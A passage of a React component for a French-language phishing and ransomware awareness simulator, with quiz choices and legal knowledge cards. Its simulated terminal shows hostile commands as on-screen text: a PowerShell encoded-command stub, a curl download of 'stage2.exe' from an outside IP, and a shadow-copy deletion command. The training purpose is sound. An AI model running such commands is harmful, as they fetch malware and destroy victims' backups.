import React, { useState, useRef, useEffect, useCallback } from 'react';
import { useLocation } from 'wouter';
import { motion, AnimatePresence } from 'framer-motion';
import {
  ChevronLeft, ChevronRight, Shield, AlertTriangle, Terminal,
  BookOpen, Clock, CheckCircle, XCircle, Info, Zap
} from 'lucide-react';

const T = {
  bg: '#ffffff', surface: '#f7f8fa', line: '#e8eaed',
  blue: '#006a9e', red: '#ef4444', green: '#10b981', amber: '#f59e0b',
  text: '#0f172a', sub: '#64748b', muted: '#94a3b8',
  MONO: "'JetBrains Mono', monospace",
  SANS: "'Plus Jakarta Sans', sans-serif",
};

// ─── Types ────────────────────────────────────────────────────────────────────

interface Choice { id: string; label: string; correct: boolean; feedback: string; }
interface TerminalLine { text: string; color?: string; delay: number; }
interface KnowledgeCard { term: string; definition: string; example?: string; law?: string; }

interface Act {
  id: string;
  chapter: string;
  title: string;
  narrative: string[];
  knowledge?: KnowledgeCard[];
  terminalLines?: TerminalLine[];
  screenType: 'inbox' | 'attachment' | 'terminal' | 'encrypting' | 'ransom' | 'anssi' | 'bilan_bad' | 'bilan_good';
  choices?: Choice[];
  autoAdvance?: number; // ms before auto-advancing (no choice)
  cursorTarget?: { x: number; y: number; label: string };
}

// ─── Story data ───────────────────────────────────────────────────────────────

const ACTS: Act[] = [
  {
    id: 'inbox',
    chapter: 'ACTE 1 / 6',
    title: 'Un email arrive dans votre boîte',
    screenType: 'inbox',
    narrative: [
      'Lundi matin, 08h47. Vous arrivez au bureau, ouvrez votre messagerie. Parmi les emails du week-end, un objet attire l\'attention :',
      '📧 **"ACTION REQUISE — Facture impayée #INV-2024-8821 — votre compte sera suspendu dans 24h"**',
      'L\'email provient de "comptabilite@votre-fournisseur-rh.fr". Le logo semble légitime, le ton est urgent, professionnel.',
      'C\'est ce qu\'on appelle du **phishing** (hameçonnage) : une technique où l\'attaquant se fait passer pour une entité de confiance pour vous pousser à agir sans réfléchir. L\'urgence créée est intentionnelle — elle court-circuite votre sens critique.',
    ],
    knowledge: [
      {
        term: 'Phishing',
        definition: 'Technique d\'ingénierie sociale par email visant à tromper la victime pour obtenir des informations sensibles ou l\'inciter à exécuter une action malveillante.',
        example: 'En 2023, 83% des entreprises françaises ont subi au moins une tentative de phishing (ANSSI).',
        law: 'Article 323-1 du Code pénal : jusqu\'à 2 ans de prison et 60 000€ d\'amende pour l\'auteur.',
      },
      {
        term: 'Ingénierie sociale',
        definition: 'Manipulation psychologique d\'une personne pour lui faire divulguer des informations ou effectuer des actions compromettant la sécurité. L\'humain est le maillon faible.',
        example: 'Kevin Mitnick, le plus célèbre hacker des années 90, disait : "Je n\'ai jamais eu besoin de hacker un ordinateur. Je hackais les gens."',
      },
    ],
    choices: [
      { id: 'open', label: '📧 Ouvrir l\'email et voir la facture', correct: false, feedback: 'Mauvais réflexe. Ouvrir un email suspect permet au pixel de tracking de confirmer que votre adresse est active et que vous êtes disponible. L\'attaquant sait maintenant que vous avez mordu à l\'hameçon.' },
      { id: 'report', label: '🛡 Signaler au service informatique sans ouvrir', correct: true, feedback: 'Excellent réflexe ! Signaler sans interagir est la bonne pratique. Le SI peut analyser les en-têtes de l\'email, bloquer l\'expéditeur au niveau du serveur et alerter l\'ensemble des collaborateurs.' },
    ],
  },
  {
    id: 'attachment',
    chapter: 'ACTE 2 / 6',
    title: 'La pièce jointe piégée',
    screenType: 'attachment',
    narrative: [
      'Vous avez ouvert l\'email. Il contient une pièce jointe : **"facture_2024_8821.pdf"**. Mais regardez attentivement l\'extension réelle du fichier dans la barre de téléchargement...',
      'Le fichier s\'appelle en réalité **"facture_2024_8821.pdf.exe"** — Windows masque les extensions connues par défaut, ce qui dissimule le vrai danger.',
      'C\'est une technique classique : usurper l\'icône d\'un PDF avec un exécutable. L\'attaquant a pris soin de faire un faux logo, une vraie mise en page professionnelle.',
      'L\'email a été envoyé depuis un **domaine typosquatté** : "fournisseur-rh.fr" au lieu de "fournisseur-rh.com". Une lettre de différence, invisible à la lecture rapide.',
    ],
    knowledge: [
      {
        term: 'Typosquatting',
        definition: 'Enregistrement de noms de domaine très proches de domaines légitimes (une lettre changée, un tiret ajouté) pour tromper les victimes.',
        example: 'paypa1.com au lieu de paypal.com — le "l" remplacé par "1".',
      },
      {
        term: 'Double extension',
        definition: 'Technique consistant à nommer un fichier exécutable avec une double extension (.pdf.exe) pour exploiter le masquage d\'extension de Windows.',
        law: 'Bonne pratique : activer l\'affichage des extensions dans Windows Explorer (Affichage → Extensions de noms de fichiers).',
      },
    ],
    choices: [
      { id: 'download', label: '💾 Télécharger et ouvrir la facture', correct: false, feedback: 'Vous venez d\'exécuter un malware. Le fichier .exe s\'est lancé silencieusement. Les prochaines étapes se déroulent en arrière-plan, invisibles à l\'œil nu.' },
      { id: 'verify', label: '🔍 Vérifier l\'expéditeur et appeler le fournisseur', correct: true, feedback: 'Parfait. Vérifier par un canal différent (téléphone) est la règle d\'or. Vous auriez découvert que le vrai fournisseur n\'a envoyé aucune facture ce jour-là.' },
    ],
  },
  {
    id: 'execution',
    chapter: 'ACTE 3 / 6',
    title: 'L\'exécution silencieuse',
    screenType: 'terminal',
    narrative: [
      'Le fichier s\'est exécuté. Rien ne semble se passer à l\'écran — c\'est voulu. En coulisse, le malware travaille en silence depuis 47 secondes.',
      'Il commence par **désactiver Windows Defender** via le registre, puis établit une connexion vers un **serveur C2** (Command & Control) en Russie. Il télécharge ensuite la charge utile principale : le ransomware.',
      'Ce type de malware utilise une technique appelée **"Living off the Land"** (LotL) : il exploite des outils légitimes déjà présents sur Windows (PowerShell, certutil, wmic) pour éviter la détection par les antivirus.',
      'À ce stade, même un bon antivirus peut rater l\'attaque. C\'est pourquoi la prévention en amont (ne pas cliquer) est infiniment plus efficace que la détection.',
    ],
    knowledge: [
      {
        term: 'C2 — Command & Control',
        definition: 'Serveur distant contrôlé par l\'attaquant, qui reçoit les données volées et envoie des instructions au malware installé chez la victime. Souvent hébergé dans des pays non-coopératifs.',
        example: 'WannaCry (2017) a infecté 200 000 machines dans 150 pays en utilisant un C2 distribué via Tor.',
      },
      {
        term: 'Living off the Land (LotL)',
        definition: 'Technique où l\'attaquant utilise uniquement des outils légitimes du système (PowerShell, WMI, certutil) pour éviter les détections basées sur les signatures antivirus.',
        law: 'NIS2 (2024) impose aux entités essentielles de mettre en place une supervision des événements système (SIEM) pour détecter ce type d\'activité.',
      },
    ],
    terminalLines: [
      { text: 'C:\\Users\\dupont> [Processus en arrière-plan]', color: '#8b949e', delay: 0 },
      { text: '> powershell -enc JABzAD0ATgBlAHcALQBPAGIAagBlAGMAd...', color: '#f59e0b', delay: 600 },
      { text: '> Désactivation Windows Defender... OK', color: '#ef4444', delay: 1400 },
      { text: '> curl http://185.220.101.47/stage2.exe -o %TEMP%\\svchost32.exe', color: '#f59e0b', delay: 2200 },
      { text: '> Connexion C2 établie : 185.220.101.47:443 (TLS)', color: '#ef4444', delay: 3200 },
      { text: '> Chargement payload ransomware v3.1... OK', color: '#ef4444', delay: 4000 },
      { text: '> Scan réseau local 192.168.1.0/24...', color: '#f59e0b', delay: 4800 },
      { text: '> Partages réseau détectés : \\\\SRV-PARTAGE\\RH, \\\\SRV-PARTAGE\\Compta', color: '#ef4444', delay: 5800 },
      { text: '> find C:\\Users -name "*.docx" "*.xlsx" "*.pdf" "*.jpg"', color: '#f59e0b', delay: 6600 },
      { text: '> 4 291 fichiers identifiés. Lancement chiffrement...', color: '#ef4444', delay: 7400 },
    ],
    autoAdvance: 9000,
  },
  {
    id: 'encrypting',
    chapter: 'ACTE 4 / 6',
    title: 'Le chiffrement — vos fichiers disparaissent',
    screenType: 'encrypting',
    narrative: [
      'Le ransomware utilise un chiffrement **AES-256** pour les fichiers et **RSA-4096** pour protéger la clé de déchiffrement. Sans la clé privée du hacker, il est **mathématiquement impossible** de retrouver vos fichiers.',
      'En 8 minutes, 4 291 fichiers sont chiffrés — documents RH, contrats clients, bases comptables, photos. Les fichiers sur les **partages réseau** accessibles depuis votre poste sont également touchés.',
      'Le malware efface aussi les **copies de shadow** de Windows (les sauvegardes automatiques internes) pour empêcher toute restauration facile.',
      'Historique réel : en mai 2017, **WannaCry** a exploité une faille NSA (EternalBlue) pour chiffrer les systèmes de la NHS britannique, d\'Airbus, de Renault et de 200 000 autres organisations en 72h.',
    ],
    knowledge: [
      {
        term: 'AES-256 + RSA-4096',
        definition: 'Combinaison de chiffrements : AES-256 (symétrique, très rapide) chiffre les fichiers, RSA-4096 (asymétrique) chiffre la clé AES. Seul l\'attaquant possède la clé RSA privée pour déchiffrer.',
        example: 'Avec la puissance de calcul actuelle, casser un chiffrement AES-256 prendrait plus longtemps que l\'âge de l\'univers.',
      },
      {
        term: 'Shadow Copy',
        definition: 'Fonctionnalité Windows créant des instantanés du système de fichiers. Les ransomwares modernes les suppriment systématiquement via "vssadmin delete shadows /all /quiet".',
        law: 'Règle 3-2-1 des sauvegardes : 3 copies, 2 supports différents, 1 hors-site (et déconnectée du réseau).',
      },
      {
        term: 'WannaCry (2017)',
        definition: 'Ransomware ayant causé 4 à 8 milliards de dollars de dommages mondiaux. Exploitait EternalBlue, une faille SMB développée par la NSA et volée par le groupe Shadow Brokers.',
        law: 'Attribution : GCHQ britannique et DOJ américain ont attribué l\'attaque à la Corée du Nord (groupe Lazarus).',
      },
    ],
    autoAdvance: 8000,
  },
  {
    id: 'ransom',
    chapter: 'ACTE 5 / 6',
    title: 'La demande de rançon',
    screenType: 'ransom',
    narrative: [
      'Un message s\'affiche sur tous les écrans de l\'entreprise. La demande : **0.8 Bitcoin** (environ 32 000€) à envoyer dans les 72 heures. Passé ce délai, le montant double. Passé 7 jours, la clé est détruite.',
      'Vous êtes maintenant face à un **dilemme légal et éthique** : payer encourage les criminels et finance potentiellement des organisations terroristes (risque de violation de sanctions OFAC). Ne pas payer signifie potentiellement perdre toutes vos données.',
      '**Obligation légale** : en France, depuis la loi LOPMI (2023), vous devez déposer plainte dans les 72h pour pouvoir être remboursé par votre cyber-assurance. L\'ANSSI recommande de **ne jamais payer** sans avoir d\'abord consulté les autorités.',
      'L\'ANSSI propose un service gratuit de déchiffrement pour certains ransomwares connus. Europol maintient le projet **No More Ransom** avec des outils de déchiffrement gratuits.',
    ],
    knowledge: [
      {
        term: 'Bitcoin & Anonymat',
        definition: 'Le Bitcoin est pseudonyme, pas anonyme. Les attaquants utilisent des mixeurs (tumblers) et des exchanges décentralisés pour blanchir les fonds. Les autorités peuvent retracer les transactions.',
        example: 'Le DOJ américain a récupéré 2,3M$ du rançon Colonial Pipeline en 2021 en traçant le portefeuille Bitcoin de DarkSide.',
      },
      {
        term: 'LOPMI & Cyber-assurance',
        definition: 'Loi d\'Orientation et de Programmation du Ministère de l\'Intérieur (2023) : les assureurs ne peuvent rembourser une cyber-rançon que si la victime a déposé plainte dans les 72h.',
        law: 'Article L12-10-1 du Code des assurances. Objectif : décourager les paiements en créant une obligation de coopération avec la justice.',
      },
      {
        term: 'ANSSI',
        definition: 'Agence Nationale de la Sécurité des Systèmes d\'Information. Autorité nationale française en cybersécurité, sous tutelle du Premier Ministre. Publie des guides, gère les incidents d\'État, certifie les produits.',
        law: 'En cas d\'incident : cybermalveillance.gouv.fr ou ANSSI (pour les OIV/OSE). Hotline : 3018 pour les TPE/PME.',
      },
    ],
    choices: [
      { id: 'pay', label: '💸 Payer la rançon immédiatement', correct: false, feedback: 'Payer ne garantit rien : seulement 65% des victimes récupèrent leurs données après paiement (Sophos, 2023). Vous devenez une cible connue, susceptible d\'être refrappée. Et vous financez peut-être des organisations sous sanctions internationales (risque pénal pour vous).' },
      { id: 'anssi', label: '🛡 Contacter l\'ANSSI et déposer plainte sous 72h', correct: true, feedback: 'C\'est la bonne voie. L\'ANSSI peut identifier la souche du ransomware et proposer un déchiffrement gratuit si la clé est connue. La plainte protège vos droits à l\'assurance. Le SI peut isoler les machines et restaurer depuis les sauvegardes hors-ligne.' },
    ],
  },
  {
    id: 'bilan',
    chapter: 'ACTE 6 / 6',
    title: 'Bilan & bonnes pratiques',
    screenType: 'bilan_good',
    narrative: [
      'Cette simulation est terminée. Voici ce que vous retenez.',
      '**La chaîne d\'attaque (Kill Chain) :** Reconnaissance → Phishing → Exécution → Persistance → Mouvement latéral → Chiffrement → Extorsion. Chaque étape est une opportunité de rupture.',
      '**Les 5 réflexes qui auraient tout évité :** Vérifier l\'expéditeur par un autre canal · Ne jamais ouvrir une pièce jointe inattendue · Activer la MFA sur tous les comptes · Maintenir des sauvegardes hors-ligne testées · Former régulièrement les équipes.',
      '**Cadre réglementaire :** RGPD Art.33 (notification CNIL sous 72h si données personnelles touchées) · NIS2 (directive européenne, transposée en France en 2024, impose des obligations aux entités essentielles) · LOPMI 2023 · Référentiel PSSI de l\'ANSSI.',
    ],
    knowledge: [
      {
        term: 'Cyber Kill Chain',
        definition: 'Modèle Lockheed Martin décrivant les 7 phases d\'une cyberattaque : Reconnaissance, Weaponization, Delivery, Exploitation, Installation, C2, Actions. Rompre une étape stoppe l\'attaque.',
      },
      {
        term: 'RGPD Article 33',
        definition: 'En cas de violation de données à caractère personnel, le responsable de traitement doit notifier la CNIL dans les 72 heures. Amende pouvant aller jusqu\'à 4% du CA mondial.',
        law: 'En France : cnil.fr → Notifications de violations. Les ransomwares constituent presque toujours une violation de données.',
      },
      {
        term: 'NIS2 (2024)',
        definition: 'Directive européenne Network and Information Security 2, transposée en France fin 2024. Élargit les obligations de cybersécurité à ~15 000 entités (vs 300 pour NIS1). Impose la notification d\'incident sous 24h.',
      },
      {
        term: 'MFA — Authentification multi-facteurs',
        definition: 'Mécanisme exigeant au moins deux preuves d\'identité (mot de passe + code SMS/app). Bloque 99,9% des attaques sur les comptes selon Microsoft.',
        law: 'Recommandation ANSSI : préférer les applications d\'authentification (TOTP) aux SMS, vulnérables au SIM swapping.',
      },
    ],
    autoAdvance: 0,
  },
];

// ─── Terminal component ───────────────────────────────────────────────────────

function TerminalScreen({ lines }: { lines: TerminalLine[] }) {
  const [visible, setVisible] = useState<number>(0);
  const endRef = useRef<HTMLDivElement>(null);

  useEffect(() => {
    setVisible(0);
    const timers: ReturnType<typeof setTimeout>[] = [];
    lines.forEach((_, i) => {
      const t = setTimeout(() => setVisible(i + 1), lines[i].delay);
      timers.push(t);
    });
    return () => timers.forEach(clearTimeout);
  }, [lines]);

  useEffect(() => { endRef.current?.scrollIntoView({ behavior: 'smooth' }); }, [visible]);

  return (
    <div style={{ background: '#0d1117', height: '100%', padding: 20, fontFamily: T.MONO, fontSize: 12, overflowY: 'auto' }}>
      <div style={{ color: '#8b949e', marginBottom: 12, fontSize: 10 }}>
        ● ● ●&nbsp;&nbsp; Terminal — session attaquant
      </div>
      {lines.slice(0, visible).map((line, i) => (
        <motion.div
          key={i}
          initial={{ opacity: 0, x: -4 }}
          animate={{ opacity: 1, x: 0 }}
          style={{ color: line.color || '#c9d1d9', marginBottom: 6, lineHeight: 1.6 }}
        >
          {line.text}
        </motion.div>
      ))}
      {visible < lines.length && (
        <motion.span animate={{ opacity: [1, 0] }} transition={{ repeat: Infinity, duration: 0.7 }} style={{ color: T.green }}>█</motion.span>
      )}
      <div ref={endRef} />
    </div>
  );
}

// ─── Inbox screen ─────────────────────────────────────────────────────────────

function InboxScreen({ cursorPos }: { cursorPos: { x: number; y: number } }) {
  return (
    <div style={{ background: '#1e2433', height: '100%', position: 'relative', overflow: 'hidden' }}>
      {/* App header */}
      <div style={{ background: '#006a9e', padding: '8px 16px', display: 'flex', alignItems: 'center', gap: 10 }}>
        <span style={{ color: '#fff', fontFamily: T.SANS, fontWeight: 700, fontSize: 13 }}>📧 Outlook — m.dupont@entreprise.fr</span>
      </div>
      {/* Email list */}
      <div style={{ display: 'grid', gridTemplateColumns: '220px 1fr', height: 'calc(100% - 37px)' }}>
        <div style={{ background: '#161b22', borderRight: '1px solid #30363d', padding: 8 }}>
          {['Boîte de réception (1)', 'Envoyés', 'Brouillons', 'Spam', 'Corbeille'].map((f, i) => (
            <div key={i} style={{ padding: '6px 10px', color: i === 0 ? '#fff' : '#8b949e', fontFamily: T.SANS, fontSize: 11, background: i === 0 ? '#006a9e22' : 'transparent', marginBottom: 2 }}>
              {f}
            </div>
          ))}
        </div>
        <div style={{ overflowY: 'auto' }}>
          {[
            { from: 'comptabilite@votre-fournisseur-rh.fr', subj: '⚠ ACTION REQUISE — Facture impayée #INV-2024-8821', time: '08:47', unread: true, suspicious: true },
            { from: 'it@entreprise.fr', subj: 'Maintenance prévue samedi 23h-01h', time: 'Ven', unread: false, suspicious: false },
            { from: 'newsletter@linkedin.com', subj: 'Marie Curie a visité votre profil', time: 'Ven', unread: false, suspicious: false },
            { from: 'rh@entreprise.fr', subj: 'Rappel : formation sécurité le 15/01', time: 'Jeu', unread: false, suspicious: false },
          ].map((email, i) => (
            <div key={i} style={{
              padding: '10px 14px',
              borderBottom: '1px solid #30363d',
              background: i === 0 ? 'rgba(239,68,68,0.08)' : 'transparent',
              cursor: 'pointer',
            }}>
              <div style={{ display: 'flex', justifyContent: 'space-between', marginBottom: 3 }}>
                <span style={{ fontFamily: T.MONO, fontSize: 10, color: email.suspicious ? T.red : '#8b949e', fontWeight: email.unread ? 700 : 400 }}>
                  {email.from}
                </span>
                <span style={{ fontFamily: T.MONO, fontSize: 9, color: '#8b949e' }}>{email.time}</span>
              </div>
              <div style={{ fontFamily: T.SANS, fontSize: 11, color: email.unread ? '#e6edf3' : '#8b949e', fontWeight: email.unread ? 600 : 400 }}>
                {email.subj}
              </div>
              {email.suspicious && (
                <div style={{ marginTop: 4, display: 'flex', alignItems: 'center', gap: 4 }}>
                  <span style={{ fontFamily: T.MONO, fontSize: 8, color: T.red, background: 'rgba(239,68,68,0.15)', padding: '1px 5px' }}>⚠ EXPÉDITEUR SUSPECT</span>
                </div>
              )}
            </div>
          ))}
        </div>
      </div>
      {/* Ghost cursor */}
      <motion.div
        animate={{ top: `${cursorPos.y}%`, left: `${cursorPos.x}%` }}
        transition={{ duration: 1.2, ease: 'easeInOut' }}
        style={{ position: 'absolute', top: `${cursorPos.y}%`, left: `${cursorPos.x}%`, transform: 'translate(-50%,-50%)', pointerEvents: 'none', zIndex: 20 }}
      >
        <div style={{ position: 'relative' }}>
          <svg width="16" height="20" viewBox="0 0 16 20" fill="none">
            <path d="M0 0L0 16L4.5 11.5L7 18L9 17L6.5 10.5L12 10.5L0 0Z" fill="#ef4444" stroke="#fff" strokeWidth="0.8" />
          </svg>
          <motion.div
            animate={{ opacity: [0, 1, 0] }}
            transition={{ repeat: Infinity, duration: 1.5, delay: 1.5 }}
            style={{ position: 'absolute', top: 20, left: 16, background: 'rgba(239,68,68,0.9)', color: '#fff', fontFamily: T.MONO, fontSize: 8, padding: '2px 5px', whiteSpace: 'nowrap' }}
          >
            clic en cours...
          </motion.div>
        </div>
      </motion.div>
    </div>
  );
}

// ─── Attachment screen ────────────────────────────────────────────────────────

function AttachmentScreen() {
  return (
    <div style={{ background: '#1e2433', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', flexDirection: 'column', padding: 24 }}>
      <div style={{ background: '#161b22', border: `1px solid ${T.red}`, padding: 24, maxWidth: 340, width: '100%' }}>
        <div style={{ fontFamily: T.SANS, fontWeight: 700, color: '#e6edf3', marginBottom: 16, fontSize: 13 }}>
          📎 Pièce jointe détectée
        </div>
        <div style={{ display: 'flex', alignItems: 'center', gap: 14, background: '#0d1117', padding: 14, marginBottom: 14 }}>
          <span style={{ fontSize: 32 }}>📄</span>
          <div>
            <div style={{ fontFamily: T.MONO, fontSize: 11, color: '#e6edf3' }}>facture_2024_8821.pdf</div>
            <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.red, marginTop: 3 }}>
              ⚠ Extension réelle : <strong>.pdf.exe</strong>
            </div>
            <div style={{ fontFamily: T.MONO, fontSize: 9, color: '#8b949e', marginTop: 2 }}>Taille : 847 KB</div>
          </div>
        </div>
        <div style={{ fontFamily: T.MONO, fontSize: 9, color: T.amber, background: 'rgba(245,158,11,0.1)', border: `1px solid ${T.amber}`, padding: 10, marginBottom: 14 }}>
          ⚠ Windows masque les extensions par défaut.<br />Ce fichier est un programme exécutable (.exe)<br />déguisé en document PDF.
        </div>
        <div style={{ fontFamily: T.SANS, fontSize: 11, color: '#8b949e' }}>
          Domaine expéditeur : <span style={{ color: T.red }}>fournisseur-rh.<strong>fr</strong></span><br />
          Domaine légitime attendu : <span style={{ color: T.green }}>fournisseur-rh.<strong>com</strong></span>
        </div>
      </div>
    </div>
  );
}

// ─── Encrypting screen ────────────────────────────────────────────────────────

function EncryptingScreen() {
  const [count, setCount] = useState(0);
  useEffect(() => {
    const i = setInterval(() => setCount(c => Math.min(c + Math.floor(Math.random() * 18) + 3, 4291)), 120);
    return () => clearInterval(i);
  }, []);
  const extensions = ['DOCX', 'XLSX', 'PDF', 'JPG', 'PPTX', 'ZIP', 'PSD', 'MP4', 'CSV', 'SQL', 'BAK', 'TXT', 'PNG', 'RAW', 'KEY', 'PST'];
  return (
    <div style={{ background: '#0d0000', height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 24, fontFamily: T.MONO }}>
      <motion.div animate={{ opacity: [1, 0.4, 1] }} transition={{ repeat: Infinity, duration: 0.9 }} style={{ color: T.red, fontSize: 16, fontWeight: 700, marginBottom: 8 }}>
        🔐 CHIFFREMENT EN COURS
      </motion.div>
      <div style={{ color: '#8b949e', fontSize: 10, marginBottom: 20 }}>AES-256-CBC + RSA-4096 | Clé envoyée au serveur C2</div>
      <div style={{ color: T.red, fontSize: 28, fontWeight: 700, marginBottom: 4 }}>{count.toLocaleString('fr-FR')}</div>
      <div style={{ color: '#8b949e', fontSize: 10, marginBottom: 20 }}>fichiers chiffrés sur 4 291</div>
      <div style={{ display: 'grid', gridTemplateColumns: 'repeat(4, 1fr)', gap: 3, width: '100%', maxWidth: 320, marginBottom: 20 }}>
        {extensions.map((ext, i) => (
          <motion.div
            key={ext}
            animate={{ background: count > (i * 268) ? ['#1a0000', T.red, '#330000'] : '#1a1a1a' }}
            transition={{ duration: 0.4 }}
            style={{ padding: '4px 0', textAlign: 'center', fontSize: 9, color: count > (i * 268) ? T.red : '#333', border: `1px solid ${count > (i * 268) ? '#330000' : '#1a1a1a'}` }}
          >
            .{ext}
          </motion.div>
        ))}
      </div>
      <div style={{ fontSize: 9, color: '#555', textAlign: 'center' }}>
        Partages réseau touchés : \\SRV-PARTAGE\RH · \\SRV-PARTAGE\Compta
      </div>
    </div>
  );
}

// ─── Ransom screen ────────────────────────────────────────────────────────────

function RansomScreen() {
  const [hours, setHours] = useState(71);
  const [mins, setMins] = useState(59);
  const [secs, setSecs] = useState(47);
  useEffect(() => {
    const i = setInterval(() => {
      setSecs(s => { if (s > 0) return s - 1; setMins(m => { if (m > 0) return m - 1; setHours(h => h > 0 ? h - 1 : 0); return 59; }); return 59; });
    }, 1000);
    return () => clearInterval(i);
  }, []);
  const pad = (n: number) => String(n).padStart(2, '0');
  return (
    <div style={{ background: '#000', height: '100%', display: 'flex', alignItems: 'center', justifyContent: 'center', padding: 20 }}>
      <div style={{ border: `2px solid ${T.red}`, padding: 28, maxWidth: 340, textAlign: 'center', fontFamily: T.MONO }}>
        <div style={{ fontSize: 36, marginBottom: 12 }}>🔒</div>
        <div style={{ color: T.red, fontSize: 14, fontWeight: 700, marginBottom: 8 }}>VOS FICHIERS ONT ÉTÉ CHIFFRÉS</div>
        <div style={{ color: '#c9d1d9', fontSize: 9, lineHeight: 1.7, marginBottom: 16 }}>
          4 291 fichiers sont inaccessibles.<br />
          Pour récupérer la clé de déchiffrement, envoyez :<br />
          <span style={{ color: T.amber, fontSize: 12, fontWeight: 700 }}>0.8 Bitcoin ≈ 32 400 €</span>
        </div>
        <div style={{ background: '#1a0000', padding: 10, marginBottom: 16, wordBreak: 'break-all', color: T.amber, fontSize: 9 }}>
          3Fk9mRxT7vQpNs2wJ8cLdHyBg5AeUiMo1Pr
        </div>
        <div style={{ color: '#8b949e', fontSize: 9, marginBottom: 8 }}>Temps restant avant destruction de la clé :</div>
        <div style={{ color: T.red, fontSize: 22, fontWeight: 700, marginBottom: 12 }}>
          {pad(hours)}:{pad(mins)}:{pad(secs)}
        </div>
        <div style={{ color: '#555', fontSize: 8 }}>
          Ne contactez pas la police. Ne tentez pas de restaurer.<br />
          Après 7 jours : clé détruite définitivement.
        </div>
      </div>
    </div>
  );
}

// ─── Bilan screen ─────────────────────────────────────────────────────────────

function BilanScreen({ good }: { good: boolean }) {
  return (
    <div style={{ background: good ? '#001a0f' : '#1a0000', height: '100%', display: 'flex', flexDirection: 'column', alignItems: 'center', justifyContent: 'center', padding: 24, fontFamily: T.MONO, textAlign: 'center' }}>
      <div style={{ fontSize: 40, marginBottom: 12 }}>{good ? '🛡' : '💀'}</div>
      <div style={{ color: good ? T.green : T.red, fontSize: 15, fontWeight: 700, marginBottom: 8 }}>
        {good ? 'ATTAQUE BLOQUÉE' : 'SYSTÈME COMPROMIS'}
      </div>
      <div style={{ color: '#8b949e', fontSize: 10, maxWidth: 260, lineHeight: 1.7, marginBottom: 20 }}>
        {good
          ? 'Vous avez pris les bonnes décisions à chaque étape. L\'ANSSI a pu identifier la souche et proposer un déchiffrement gratuit. Données récupérées à 100%.'
          : 'L\'entreprise a payé la rançon. 65% de chance de récupérer les données. Vous êtes désormais sur la liste des "payeurs" — cible prioritaire pour une prochaine attaque.'}
      </div>
      <div style={{ display: 'grid', gridTemplateColumns: '1fr 1fr', gap: 8, width: '100%', maxWidth: 280 }}>
        {[
          { label: 'Données récupérées', value: good ? '100%' : '62%', ok: good },
          { label: 'Coût incident', value: good ? '~8 000€' : '~89 000€', ok: good },
          { label: 'Temps arrêt', value: good ? '4h' : '11 jours', ok: good },
          { label: 'Conformité RGPD', value: good ? '✓ Notifié' : '✗ En défaut', ok: good },
        ].map((item, i) => (
          <div key={i} style={{ background: good ? 'rgba(16,185,129,0.1)' : 'rgba(239,68,68,0.1)', border: `1px solid ${good ? T.green : T.red}22`, padding: 10 }}>
            <div style={{ color: '#8b949e', fontSize: 8, marginBottom: 3 }}>{item.label}</div>
            <div style={{ color: item.ok ? T.green : T.red, fontSize: 12, fontWeight: 700 }}>{item.value}</div>
          </div>
        ))}
      </div>
    </div>
  );
}

// ─── Knowledge card ───────────────────────────────────────────────────────────

function KnowledgePanel({ cards }: { cards: KnowledgeCard[] }) {
  const [open, setOpen] = useState<number | null>(null);
  return (
    <div style={{ display: 'flex', flexDirection: 'column', gap: 8 }}>
      {cards.map((card, i) => (
        <div key={i} style={{ border: `1px solid ${T.line}`, background: T.surface }}>
          <button
            onClick={() => setOpen(open === i ? null : i)}
            style={{ width: '100%', padding: '10px 14px', background: 'none', border: 'none', cursor: 'pointer', display: 'flex', alignItems: 'center', justifyContent: 'space-between', gap: 8 }}
          >
            <div style={{ display: 'flex', alignItems: 'center', gap: 8 }}>
              <BookOpen size={11} color={T.blue} />
              <span style={{ fontFamily: T.MONO, fontSize: 10, fontWeight: 700, color: T.blue, letterSpacing: '0.03em' }}>{card.term}</span>
            </div>
            <ChevronRight size={11} color={T.muted} style={{ transform: open === i ? 'rotate(90deg)' : 'none', transition: 'transform 0.15s' }} />
          </button>
          <AnimatePresence>
            {open === i && (
              <motion.div
                initial={{ height: 0, opacity: 0 }}
                animate={{ height: 'auto', opacity: 1 }}
                exit={{ height: 0, opacity: 0 }}
                transition={{ duration: 0.2 }}
                style={{ overflow: 'hidden' }}
              >
                <div style={{ padding: '0 14px 12px', borderTop: `1px solid ${T.line}` }}>
                  <p style={{ fontFamily: T.SANS, fontSize: 12, color: T.sub, lineHeight: 1.65, margin: '10px 0 0' }}>{card.definition}</p>
                  {card.example && (
                    <div style={{ marginTop: 8, padding: '8px 10px', background: '#fff', border: `1px solid ${T.line}`, borderLeft: `3px solid ${T.blue}` }}>
                      <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.muted, textTransform: 'uppercase', letterSpacing: '0.06em' }}>Exemple réel</span>
                      <p style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, margin: '4px 0 0', lineHeight: 1.55 }}>{card.example}</p>
                    </div>
                  )}
                  {card.law && (
                    <div style={{ marginTop: 8, padding: '8px 10px', background: '#fff8f0', border: `1px solid ${T.amber}33`, borderLeft: `3px solid ${T.amber}` }}>
                      <span style={{ fontFamily: T.MONO, fontSize: 9, color: T.amber, textTransform: 'uppercase', letterSpacing: '0.06em' }}>⚖ Cadre légal / bonne pratique</span>
                      <p style={{ fontFamily: T.SANS, fontSize: 11, color: T.sub, margin: '4px 0 0', lineHeight: 1.55 }}>{card.law}</p>
                    </div>
                  )}
                </div>
              </motion.div>
            )}
          </AnimatePresence>
        </div>
      ))}
    </div>
  );
}

// ─── Main component ───────────────────────────────────────────────────────────

export default function AttackSimulator() {
  const [, navigate] = useLocation();
  const [actIndex, setActIndex] = useState(0);
  const [userChoices, setUserChoices] = useState<Record<string, string>>({});
  const [choiceResult, setChoiceResult] = useState<{ correct: boolean; feedback: string } | null>(null);
  const [canAdvance, setCanAdvance] = useState(false);
  const [cursorPos, setCursorPos] = useState({ x: 20, y: 30 });
  const autoRef = useRef<ReturnType<typeof setTimeout> | null>(null);

  const act = ACTS[actIndex];
  const isLast = actIndex === ACTS.length - 1;

  // Determine bilan screen
  const bilanGood = Object.values(userChoices).filter((v, i) => {
    const actWithChoice = ACTS.filter(a => a.choices).map(a => a.choices!);
    return actWithChoice[i]?.find(c => c.id === v)?.correct;
  }).length >= 2;

  // Cursor animation for inbox
  useEffect(() => {
    if (act.screenType !== 'inbox') return;
